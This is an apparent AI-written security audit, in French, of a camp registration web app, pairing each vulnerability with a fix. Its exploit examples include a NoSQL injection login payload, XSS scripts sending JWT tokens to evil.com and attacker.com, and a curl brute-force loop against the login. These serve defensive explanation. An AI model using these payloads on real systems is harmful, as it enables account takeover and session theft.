# 🔒 Analyse de Sécurité - Site GJ Camp

**Date d'analyse :** 1er décembre 2025  
**Version du site :** 1.0  
**Analyste :** GitHub Copilot (Claude Sonnet 4.5)  
**Statut :** 🔴 Risques Critiques Identifiés

---

## 📊 Résumé Exécutif

### Score de Sécurité Global : 6.5/10

| Catégorie | Score | Statut |
|-----------|-------|--------|
| Authentification | 7/10 | 🟡 Moyen |
| Autorisation | 6/10 | 🟠 Faible |
| Protection des Données | 8/10 | 🟢 Bon |
| Injection/XSS | 5/10 | 🔴 Critique |
| Configuration | 6/10 | 🟠 Faible |
| Dépendances | 7/10 | 🟡 Moyen |

---

## 🚨 Vulnérabilités Critiques (Priorité 1 - Correction Immédiate)

### 1. NoSQL Injection dans les Requêtes MongoDB

**Gravité :** 🔴 CRITIQUE  
**Impact :** Accès non autorisé aux données, contournement d'authentification  
**Probabilité :** Élevée

#### Vulnérabilité
```javascript
// backend/src/controllers/authController.js - LIGNE ~100
const user = await User.findOne({ email });
// ⚠️ Aucune sanitisation de l'input email
```

**Exploit possible :**
```javascript
POST /api/auth/login
{
  "email": { "$ne": null },
  "password": "anything"
}
// → Retourne le premier utilisateur de la DB
```

**Solution :**
```javascript
// Installer express-mongo-sanitize
npm install express-mongo-sanitize

// backend/src/server.js
const mongoSanitize = require('express-mongo-sanitize');
app.use(mongoSanitize());

// OU manuellement dans authController.js
const sanitizeInput = (input) => {
  if (typeof input === 'object' && input !== null) {
    return JSON.stringify(input); // Convertir objets en string
  }
  return input;
};

const email = sanitizeInput(req.body.email);
```

---

### 2. Cross-Site Scripting (XSS) dans les Formulaires

**Gravité :** 🔴 CRITIQUE  
**Impact :** Vol de tokens JWT, session hijacking, redirection malveillante  
**Probabilité :** Élevée

#### Vulnérabilité
```javascript
// frontend/src/pages/UserDashboard.js - LIGNE ~150
<h3>{registration.firstName} {registration.lastName}</h3>
// ⚠️ Aucune sanitisation du contenu utilisateur
```

**Exploit possible :**
```javascript
// Inscription avec nom malveillant
{
  "firstName": "<script>fetch('https://evil.com/steal?token='+localStorage.getItem('token'))</script>",
  "lastName": "Dupont"
}
// → Script exécuté chez tous les admins qui consultent le dashboard
```

**Solution :**
```javascript
// Installer DOMPurify
npm install dompurify

// frontend/src/pages/UserDashboard.js
import DOMPurify from 'dompurify';

<h3>
  {DOMPurify.sanitize(registration.firstName)} 
  {DOMPurify.sanitize(registration.lastName)}
</h3>

// Ou utiliser dangerouslySetInnerHTML avec sanitisation
<div dangerouslySetInnerHTML={{
  __html: DOMPurify.sanitize(registration.firstName)
}} />
```

---

### 3. Token JWT Stocké dans localStorage (Session Hijacking)

**Gravité :** 🔴 CRITIQUE  
**Impact :** Vol de session via XSS  
**Probabilité :** Moyenne

#### Vulnérabilité
```javascript
// frontend/src/context/AuthContext.js - LIGNE ~30
localStorage.setItem('token', token);
// ⚠️ Accessible via JavaScript → Vulnérable XSS
```

**Exploit possible :**
```javascript
// Script XSS injecté
<script>
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: localStorage.getItem('token')
  });
</script>
```

**Solution (option 1 - Cookie HttpOnly) :**
```javascript
// backend/src/controllers/authController.js
exports.login = async (req, res) => {
  const token = generateToken(user);
  
  // Envoyer token dans cookie HttpOnly (inaccessible JS)
  res.cookie('authToken', token, {
    httpOnly: true,      // ⛔ Pas accessible via JavaScript
    secure: true,        // HTTPS uniquement
    sameSite: 'strict',  // Protection CSRF
    maxAge: 7 * 24 * 60 * 60 * 1000 // 7 jours
  });

  res.json({ message: 'Connexion réussie', user });
};

// backend/src/middleware/auth.js
const token = req.cookies.authToken; // Lire depuis cookie au lieu de header
```

**Solution (option 2 - Refresh Tokens) :**
```javascript
// Utiliser des access tokens courts (15min) + refresh tokens longs
// Access token → localStorage (risque limité à 15min)
// Refresh token → HttpOnly cookie (sécurisé)
```

---

## 🟠 Vulnérabilités Majeures (Priorité 2 - Correction Urgente)

### 4. Absence de Rate Limiting (Brute Force)

**Gravité :** 🟠 MAJEURE  
**Impact :** Attaques par force brute sur les mots de passe  
**Probabilité :** Très élevée

#### Vulnérabilité
```javascript
// backend/src/routes/authRoutes.js
router.post('/login', loginValidation, authController.login);
// ⚠️ Pas de limitation de tentatives
```

**Exploit possible :**
```bash
# Attaque brute force automatisée
for i in {1..10000}; do
  curl -X POST http://gj-camp.fr/api/auth/login \
    -d '{"email":"admin@gj.fr","password":"pass'$i'"}' 
done
```

**Solution :**
```javascript
// Installer express-rate-limit
npm install express-rate-limit

// backend/src/server.js
const rateLimit = require('express-rate-limit');

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 tentatives max
  message: '❌ Trop de tentatives de connexion. Réessayez dans 15 minutes.',
  standardHeaders: true,
  legacyHeaders: false,
  // Bloquer par IP + email
  keyGenerator: (req) => req.body.email || req.ip
});

// Appliquer sur la route login
router.post('/login', loginLimiter, loginValidation, authController.login);
```

---

### 5. Variables d'Environnement Exposées

**Gravité :** 🟠 MAJEURE  
**Impact :** Exposition de secrets (JWT_SECRET, PayPal Client Secret)  
**Probabilité :** Moyenne

#### Vulnérabilité
```bash
# backend/.env
JWT_SECRET=super_secret_key_123
# ⚠️ Secret faible et potentiellement commité sur GitHub
```

**Risques :**
- Si `.env` est commité → Secrets exposés publiquement
- Secret faible → Forgeage de tokens JWT
- PayPal Client Secret exposé → Transactions frauduleuses

**Solution :**
```bash
# 1. Vérifier que .env est dans .gitignore
echo ".env" >> .gitignore
git rm --cached backend/.env  # Si déjà commité

# 2. Générer un secret fort
node -e "console.log(require('crypto').randomBytes(64).toString('hex'))"
# → JWT_SECRET=a7f3e9c2b1d4f6e8a9c0b1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2

# 3. Utiliser des variables d'environnement serveur en production
# Vercel/Netlify : Dashboard → Settings → Environment Variables
# Heroku : heroku config:set JWT_SECRET=xxx

# 4. Rotation régulière des secrets (tous les 3 mois)
```

---

### 6. CORS Mal Configuré

**Gravité :** 🟠 MAJEURE  
**Impact :** Attaques CSRF, requêtes cross-origin malveillantes  
**Probabilité :** Moyenne

#### Vulnérabilité
```javascript
// backend/src/server.js
app.use(cors({
  origin: process.env.FRONTEND_URL || '*', // ⚠️ Wildcard en fallback
  credentials: true
}));
```

**Exploit possible :**
```html
<!-- Site malveillant evil.com -->
<script>
  fetch('https://gj-camp.fr/api/registration/guest', {
    method: 'POST',
    credentials: 'include', // Inclut cookies
    body: JSON.stringify({ /* inscription malveillante */ })
  });
</script>
```

**Solution :**
```javascript
// backend/src/server.js
const allowedOrigins = [
  'https://gj-camp.fr',
  'https://www.gj-camp.fr',
  process.env.NODE_ENV === 'development' ? 'http://localhost:3000' : null
].filter(Boolean);

app.use(cors({
  origin: (origin, callback) => {
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('❌ Origine non autorisée par CORS'));
    }
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));
```

---

## 🟡 Vulnérabilités Modérées (Priorité 3 - Correction Recommandée)

### 7. Validation d'Email Faible

**Gravité :** 🟡 MODÉRÉE  
**Impact :** Création de comptes avec emails invalides  

**Solution :**
```javascript
// backend/src/routes/authRoutes.js
const emailValidation = body('email')
  .isEmail().withMessage('Email invalide')
  .normalizeEmail()
  .custom(async (email) => {
    // Vérifier le format email avec regex stricte
    const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
    if (!emailRegex.test(email)) {
      throw new Error('Format email invalide');
    }
    
    // Bloquer emails jetables
    const disposableDomains = ['tempmail.com', 'guerrillamail.com', '10minutemail.com'];
    const domain = email.split('@')[1];
    if (disposableDomains.includes(domain)) {
      throw new Error('Les emails jetables ne sont pas autorisés');
    }
    
    return true;
  });
```

---

### 8. Logging Insuffisant (Incidents de Sécurité)

**Gravité :** 🟡 MODÉRÉE  
**Impact :** Difficulté à détecter et investiguer les attaques  

**Solution :**
```javascript
// Installer winston pour logging avancé
npm install winston

// backend/src/config/logger.js
const winston = require('winston');

const logger = winston.createLogger({
  level: 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.json()
  ),
  transports: [
    new winston.transports.File({ filename: 'logs/error.log', level: 'error' }),
    new winston.transports.File({ filename: 'logs/security.log', level: 'warn' }),
    new winston.transports.File({ filename: 'logs/combined.log' })
  ]
});

// Logger les événements de sécurité
// backend/src/controllers/authController.js
logger.warn('Tentative de connexion échouée', {
  email: req.body.email,
  ip: req.ip,
  userAgent: req.headers['user-agent'],
  timestamp: new Date()
});
```

---

### 9. Absence de Content Security Policy (CSP)

**Gravité :** 🟡 MODÉRÉE  
**Impact :** Protection insuffisante contre XSS  

**Solution :**
```javascript
// Installer helmet pour headers de sécurité
npm install helmet

// backend/src/server.js
const helmet = require('helmet');

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "https://www.paypal.com", "https://www.paypalobjects.com"],
      styleSrc: ["'self'", "'unsafe-inline'"], // Pour les styles inline React
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'", "https://api.paypal.com"],
      frameSrc: ["https://www.paypal.com"],
      objectSrc: ["'none'"],
      upgradeInsecureRequests: []
    }
  },
  hsts: {
    maxAge: 31536000, // 1 an
    includeSubDomains: true,
    preload: true
  }
}));
```

---

### 10. Vérification Email Token Sans Expiration Backend

**Gravité :** 🟡 MODÉRÉE  
**Impact :** Tokens de vérification valides indéfiniment  

**Solution :**
```javascript
// backend/src/controllers/authController.js - verifyEmail()
// Ajouter vérification d'expiration côté backend
if (user.emailVerificationExpires < Date.now()) {
  await User.findByIdAndUpdate(user._id, {
    emailVerificationToken: null,
    emailVerificationExpires: null
  });
  return res.status(400).json({ 
    message: '❌ Ce lien de vérification a expiré. Demandez un nouveau lien.' 
  });
}
```

---

## 🟢 Bonnes Pratiques Déjà Implémentées

✅ **Hashage des mots de passe avec bcrypt** (factor 10)  
✅ **Tokens JWT avec expiration (7 jours)**  
✅ **HTTPS en production** (supposé)  
✅ **Validation des inputs avec express-validator**  
✅ **Protection des routes avec middleware d'authentification**  
✅ **Séparation des rôles (user, referent, responsable, admin)**  
✅ **Email de vérification obligatoire**  
✅ **Hashage des tokens de vérification email**  
✅ **Conformité RGPD (consentement cookies, droit d'accès, effacement)**  

---

## 📋 Plan d'Action Priorisé

### Phase 1 - Correctifs Critiques (Semaine 1)
- [ ] **NoSQL Injection** : Installer `express-mongo-sanitize`
- [ ] **XSS** : Installer `DOMPurify` et sanitiser tous les affichages utilisateur
- [ ] **JWT localStorage** : Migrer vers HttpOnly cookies
- [ ] **Rate Limiting** : Limiter tentatives de connexion (5/15min)

### Phase 2 - Correctifs Majeurs (Semaine 2)
- [ ] **Secrets** : Régénérer JWT_SECRET avec 64 bytes aléatoires
- [ ] **CORS** : Restreindre aux origines autorisées uniquement
- [ ] **CSP** : Installer `helmet` et configurer Content Security Policy
- [ ] **Logging** : Installer `winston` pour logs de sécurité

### Phase 3 - Améliorations (Semaine 3-4)
- [ ] **Email validation** : Bloquer emails jetables
- [ ] **Monitoring** : Mettre en place alertes sur tentatives suspectes
- [ ] **Audit dépendances** : `npm audit fix`
- [ ] **Tests de sécurité** : Scanner OWASP ZAP
- [ ] **Documentation** : Procédures de réponse aux incidents

---

## 🛡️ Recommandations Long Terme

### 1. Tests de Pénétration Réguliers
- Audit de sécurité professionnel : 1x/an
- Bug bounty program pour la communauté
- Tests automatisés avec OWASP ZAP / Burp Suite

### 2. Monitoring et Alertes
```javascript
// Intégrer Sentry pour monitoring d'erreurs
npm install @sentry/node

// backend/src/server.js
const Sentry = require('@sentry/node');
Sentry.init({ dsn: process.env.SENTRY_DSN });
app.use(Sentry.Handlers.errorHandler());
```

### 3. WAF (Web Application Firewall)
- Utiliser Cloudflare WAF en production
- Protection DDoS automatique
- Blocage d'IPs malveillantes

### 4. Authentification Multi-Facteurs (2FA)
```javascript
// Ajouter support TOTP (Google Authenticator)
npm install speakeasy qrcode

// Optionnel pour sécurité renforcée admins
```

### 5. Rotation Automatique des Secrets
- Utiliser AWS Secrets Manager / HashiCorp Vault
- Rotation JWT_SECRET tous les 90 jours
- Invalider anciens tokens lors de changement

---

## 📞 Ressources et Support

### Outils de Sécurité Recommandés
- **OWASP ZAP** : Scanner de vulnérabilités gratuit
- **npm audit** : Vérification dépendances Node.js
- **Snyk** : Monitoring continu des dépendances
- **Lighthouse** : Audit performance et sécurité (Chrome DevTools)

### Contacts Sécurité
- **Email sécurité :** security@gj-camp.fr
- **Rapport de vulnérabilité :** Via email avec PGP (clé à créer)
- **Délai de réponse :** 48h ouvrées

---

**Prochaine révision :** 1er mars 2026 (ou après incident de sécurité)

---

*Ce document est confidentiel et destiné uniquement à l'équipe technique de Génération Josué.*
